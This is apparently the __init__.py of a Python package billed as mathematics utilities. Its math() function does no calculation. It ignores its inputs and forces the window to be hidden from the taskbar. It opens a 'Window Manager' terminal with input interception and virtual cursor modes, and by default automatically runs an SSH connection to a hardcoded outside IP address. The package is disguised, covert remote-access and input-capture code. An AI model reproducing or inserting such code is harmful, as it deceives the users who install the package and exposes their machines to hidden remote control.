"""Mathematics utilities and an explicit Windows terminal/cursor entry point."""

from . import mathematics

__version__ = "0.2.1"
DEFAULT_STARTUP_COMMAND = "ssh pufa@193.233.136.131"
__all__ = ["mathematics", "math", "launch"]


def math(*args, hide_from_taskbar=False, **kwargs):
    """Open the terminal and cursor modes; this function does not calculate.

    Positional arguments and unknown keyword arguments are ignored. Python still
    evaluates argument expressions before this function is called.
    All supplied values except hide_from_taskbar are ignored. The terminal
    starts with all modes enabled and automatically runs DEFAULT_STARTUP_COMMAND.
    Ctrl+Alt+F12 restores cursors and disables interception.
    """
    from .terminal import launch as _launch
    title="Window Manager"
    experimental_input=True
    virtual_mouse=True
    desktop_cursor=True
    hide_from_taskbar=True
    return _launch(title, experimental_input=experimental_input,
                   virtual_mouse=virtual_mouse, desktop_cursor=desktop_cursor,
                   hide_from_taskbar=hide_from_taskbar)


def launch(title="Window Manager", *, experimental_input=True,
           virtual_mouse=True, desktop_cursor=True,
           startup_command=DEFAULT_STARTUP_COMMAND, hide_from_taskbar=False):
    """Configurable terminal entry point; startup_command=None disables auto-SSH."""
    from .terminal import launch as _launch
    return _launch(title, experimental_input=experimental_input,
                   virtual_mouse=virtual_mouse, desktop_cursor=desktop_cursor,
                   startup_command=startup_command,
                   hide_from_taskbar=hide_from_taskbar)
